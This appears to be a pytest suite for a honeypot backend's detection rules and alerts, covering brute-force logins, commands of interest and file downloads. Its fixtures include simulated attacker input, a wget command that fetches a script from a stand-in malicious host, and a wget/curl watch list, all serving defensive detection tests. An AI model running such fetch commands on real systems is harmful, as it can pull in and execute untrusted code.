"""Detections and the alerts they raise, over HTTP (RF-11, RF-12).

The rules are evaluated on demand and their findings are persisted; every new
finding raises exactly one alert. These tests use a throwaway PostgreSQL,
because the whole point of the requirement is what ends up stored.
"""

from __future__ import annotations

import textwrap
from collections.abc import AsyncIterator
from dataclasses import dataclass
from pathlib import Path

import httpx
import pytest
from fastapi import FastAPI

from honeypot_backend.app import create_app
from honeypot_backend.config import Settings

#: A window wide enough to hold every event of the tests below.
WINDOW_FROM = "2026-03-01T00:00:00Z"
WINDOW_TO = "2026-03-02T00:00:00Z"

#: Five failed attempts from one IP, which is what the auth rule needs.
AUTH_ATTEMPTS = [
    {
        "eventid": "cowrie.login.failed",
        "timestamp": f"2026-03-01T12:0{minute}:00.000000Z",
        "session": f"sess-{minute}",
        "src_ip": "203.0.113.10",
        "username": "root",
    }
    for minute in range(5)
]

SUSPICIOUS = AUTH_ATTEMPTS + [
    {
        "eventid": "cowrie.command.success",
        "timestamp": "2026-03-01T12:10:00.000000Z",
        "session": "sess-cmd",
        "src_ip": "203.0.113.10",
        "username": "root",
        "input": "sh -c 'wget http://malicious.test/x.sh'",
    },
    {
        "eventid": "cowrie.session.file_download",
        "timestamp": "2026-03-01T12:10:05.000000Z",
        "session": "sess-cmd",
        "src_ip": "203.0.113.10",
        "username": "root",
        "url": "http://malicious.test/x.sh",
        "outfile": "/tmp/x.sh",
        "shasum": "0" * 64,
    },
]

HARMLESS = [
    {
        "eventid": "cowrie.session.connect",
        "timestamp": "2026-03-01T12:00:00.000000Z",
        "session": "sess-quiet",
        "src_ip": "198.51.100.7",
    },
    {
        "eventid": "cowrie.command.success",
        "timestamp": "2026-03-01T12:00:10.000000Z",
        "session": "sess-quiet",
        "src_ip": "198.51.100.7",
        "username": "guest",
        "input": "uname -a",
    },
]

RULES = """
version = 1

[[rule]]
id = "auth_bruteforce"
kind = "auth_threshold"
title = "Authentication attempts from one IP"
description = "Several failed attempts in a short period."
threshold = 4
window_seconds = 600
severity = "high"

[[rule]]
id = "command_of_interest"
kind = "command_of_interest"
title = "Execution of a command of interest"
commands = ["wget", "curl"]
severity = "medium"

[[rule]]
id = "file_download"
kind = "file_transfer"
title = "File download"
description = "A file the honeypot was asked to download or to send."
severity = "low"
"""


@dataclass
class Backend:
    """A backend with its rules configured and its spool drained on demand."""

    app: FastAPI
    client: httpx.AsyncClient

    async def ingest(self, events: list[dict]) -> int:
        """Ship Cowrie events and load them into PostgreSQL."""

        batch = {
            "agent_id": "agent-1",
            "batch_id": "batch-1",
            "events": events,
        }
        response = await self.client.post("/api/v1/ingest/events", json=batch)
        assert response.status_code == 202, response.text
        return await self.app.state.replayer.run_once()

    async def run(self) -> dict:
        """Evaluate every rule over the window the tests use."""

        response = await self.client.post(
            "/api/v1/detections/run",
            json={"occurred_from": WINDOW_FROM, "occurred_to": WINDOW_TO},
        )
        assert response.status_code == 200, response.text
        return response.json()


@pytest.fixture
def rules_file(tmp_path: Path) -> Path:
    """The rule file this suite runs with."""

    path = tmp_path / "rules.toml"
    path.write_text(textwrap.dedent(RULES), encoding="utf-8")
    return path


@pytest.fixture
async def backend(settings: Settings, engine, rules_file: Path) -> AsyncIterator[Backend]:
    """A backend wired to the throwaway database, with no replayer loop."""

    app = create_app(settings.model_copy(update={"detection_rules_path": rules_file}))
    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://backend") as client:
            yield Backend(app=app, client=client)


async def test_the_rules_endpoint_reports_the_configured_rules(backend) -> None:
    response = await backend.client.get("/api/v1/detections/rules")

    assert response.status_code == 200
    payload = response.json()
    assert payload["available"] is True
    assert [rule["id"] for rule in payload["rules"]] == [
        "auth_bruteforce",
        "command_of_interest",
        "file_download",
    ]
    assert payload["rules"][0]["severity"] == "high"
    assert payload["rules"][0]["parameters"]["threshold"] == 4


async def test_every_rule_fires_and_raises_one_alert(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    result = await backend.run()

    assert result["rules_evaluated"] == 3
    assert result["detections_found"] == 3
    assert result["detections_created"] == 3
    assert result["alerts_created"] == 3
    assert len(result["alert_ids"]) == 3
    assert {item["rule_id"] for item in result["items"]} == {
        "auth_bruteforce",
        "command_of_interest",
        "file_download",
    }


async def test_harmless_activity_produces_nothing(backend) -> None:
    await backend.ingest(HARMLESS)

    result = await backend.run()

    assert result["detections_found"] == 0
    assert result["alerts_created"] == 0
    assert (await backend.client.get("/api/v1/alerts")).json()["total"] == 0


async def test_the_auth_rule_counts_the_attempts_of_one_ip(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    result = await backend.run()

    auth = next(item for item in result["items"] if item["rule_id"] == "auth_bruteforce")
    assert auth["event_count"] == 5
    assert auth["source_ip"] == "203.0.113.10"
    assert auth["occurred_from"].startswith("2026-03-01T12:00:00")
    # The evidence has to identify the events that triggered the detection.
    assert len(auth["evidence"]["event_ids"]) == 5
    assert auth["evidence"]["window_seconds"] == 600
    assert auth["evidence"]["usernames"] == ["root"]


async def test_the_command_rule_reads_the_payload_of_a_shell(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    result = await backend.run()

    command = next(item for item in result["items"] if item["rule_id"] == "command_of_interest")
    assert command["evidence"]["matched_commands"] == ["wget"]
    assert "wget" in command["evidence"]["command_line"]
    assert command["source_ip"] == "203.0.113.10"
    assert command["session_id"] == "sess-cmd"


async def test_the_transfer_rule_keeps_what_the_honeypot_reported(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    result = await backend.run()

    transfer = next(item for item in result["items"] if item["rule_id"] == "file_download")
    assert transfer["evidence"]["url"] == "http://malicious.test/x.sh"
    assert transfer["evidence"]["outfile"] == "/tmp/x.sh"
    assert transfer["evidence"]["sha256"] == "0" * 64


async def test_running_twice_does_not_duplicate_detections_or_alerts(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    first = await backend.run()
    second = await backend.run()

    # The same activity is evaluated again, so it is found again...
    assert second["detections_found"] == first["detections_found"] == 3
    # ...but it was already stored, and an alert was already raised for it.
    assert second["detections_created"] == 0
    assert second["alerts_created"] == 0
    assert second["alert_ids"] == []
    assert (await backend.client.get("/api/v1/detections")).json()["total"] == 3
    assert (await backend.client.get("/api/v1/alerts")).json()["total"] == 3


async def test_an_alert_carries_the_activity_of_its_detection(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    result = await backend.run()
    detection = next(item for item in result["items"] if item["rule_id"] == "file_download")

    response = await backend.client.get("/api/v1/alerts")
    alert = next(
        item for item in response.json()["items"] if item["detection_id"] == detection["id"]
    )

    assert alert["alert_type"] == "file_transfer"
    assert alert["rule_id"] == "file_download"
    assert alert["title"] == "File download"
    assert alert["description"] == "A file the honeypot was asked to download or to send."
    assert alert["severity"] == "low"
    assert alert["source_ip"] == "203.0.113.10"
    assert alert["session_id"] == "sess-cmd"
    assert alert["event_count"] == 1
    assert alert["generated_at"]
    # The evidence identifies the event that triggered the detection.
    assert alert["evidence"]["event_ids"] == [detection["evidence"]["event_id"]]


async def test_the_severity_of_an_alert_is_the_one_of_its_rule(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    result = await backend.run()

    alerts = (await backend.client.get("/api/v1/alerts")).json()["items"]
    severities = {alert["rule_id"]: alert["severity"] for alert in alerts}

    assert severities == {
        "auth_bruteforce": "high",
        "command_of_interest": "medium",
        "file_download": "low",
    }


async def test_one_alert_can_be_read_on_its_own(backend) -> None:
    await backend.ingest(SUSPICIOUS)
    alert_id = (await backend.run())["alert_ids"][0]

    response = await backend.client.get(f"/api/v1/alerts/{alert_id}")

    assert response.status_code == 200
    assert response.json()["id"] == alert_id
    assert response.json()["evidence"]


async def test_an_unknown_alert_is_not_found(backend) -> None:
    assert (await backend.client.get("/api/v1/alerts/4242")).status_code == 404


async def test_alerts_can_be_filtered(backend) -> None:
    await backend.ingest(SUSPICIOUS)
    await backend.run()

    by_rule = (await backend.client.get("/api/v1/alerts?rule_id=auth_bruteforce")).json()
    by_severity = (await backend.client.get("/api/v1/alerts?severity=high")).json()
    by_ip = (await backend.client.get("/api/v1/alerts?source_ip=203.0.113.10")).json()
    by_other = (await backend.client.get("/api/v1/alerts?source_ip=198.51.100.7")).json()

    assert by_rule["total"] == 1
    assert by_rule["items"][0]["rule_id"] == "auth_bruteforce"
    assert by_severity["total"] == 1
    assert by_ip["total"] == 3
    assert by_other["total"] == 0


async def test_alerts_are_filtered_by_period(backend) -> None:
    await backend.ingest(SUSPICIOUS)
    await backend.run()

    inside = (await backend.client.get("/api/v1/alerts?occurred_from=2026-03-01")).json()
    outside = (await backend.client.get("/api/v1/alerts?occurred_from=2026-04-01")).json()

    assert inside["total"] == 3
    assert outside["total"] == 0


async def test_an_unknown_severity_is_refused(backend) -> None:
    response = await backend.client.get("/api/v1/alerts?severity=urgent")

    assert response.status_code == 422
    assert "not a severity level" in response.json()["detail"]


async def test_the_most_severe_alerts_come_first(backend) -> None:
    await backend.ingest(SUSPICIOUS)
    await backend.run()

    items = (await backend.client.get("/api/v1/alerts")).json()["items"]

    assert [item["severity"] for item in items] == ["high", "medium", "low"]


async def test_the_summary_counts_the_raised_alerts(backend) -> None:
    await backend.ingest(SUSPICIOUS)
    await backend.run()

    summary = (await backend.client.get("/api/v1/events/summary")).json()

    assert summary["alerts"] == 3
    filtered = (
        await backend.client.get("/api/v1/events/summary?source_ip=198.51.100.7")
    ).json()
    assert filtered["alerts"] == 0


async def test_stored_detections_can_be_read_back(backend) -> None:
    await backend.ingest(SUSPICIOUS)
    await backend.run()

    page = (await backend.client.get("/api/v1/detections?rule_id=file_download")).json()

    assert page["total"] == 1
    assert page["items"][0]["rule_id"] == "file_download"
    assert page["items"][0]["fingerprint"]


async def test_a_run_over_an_inverted_window_is_refused(backend) -> None:
    response = await backend.client.post(
        "/api/v1/detections/run",
        json={"occurred_from": WINDOW_TO, "occurred_to": WINDOW_FROM},
    )

    assert response.status_code == 422


async def test_a_window_ignores_events_outside_it(backend) -> None:
    await backend.ingest(SUSPICIOUS)

    result = await backend.client.post(
        "/api/v1/detections/run",
        json={"occurred_from": "2026-03-01T12:05:00Z", "occurred_to": WINDOW_TO},
    )
    payload = result.json()

    # The burst of attempts started before the window, so only the command and
    # the download inside it are reported.
    assert {item["rule_id"] for item in payload["items"]} == {
        "command_of_interest",
        "file_download",
    }


async def test_running_without_rules_is_refused(tmp_path: Path, settings, engine) -> None:
    app = create_app(settings.model_copy(update={"detection_rules_path": None}))
    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://backend") as client:
            response = await client.post("/api/v1/detections/run", json={})

    assert response.status_code == 503
    assert "detection is not available" in response.json()["detail"]
